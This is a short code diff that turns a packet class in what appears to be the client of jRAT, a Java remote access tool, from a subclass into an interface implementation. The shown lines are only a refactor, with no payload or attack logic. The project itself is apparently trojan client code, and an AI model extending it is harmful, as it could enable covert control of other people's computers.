@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 import jrat.common.utils.UserUtils;
 
-public class Packet5InitUserHost extends AbstractOutgoingPacket {
+public class Packet5InitUserHost implements OutgoingPacket {
 
 	@Override
 	public void write(Connection con) throws Exception {
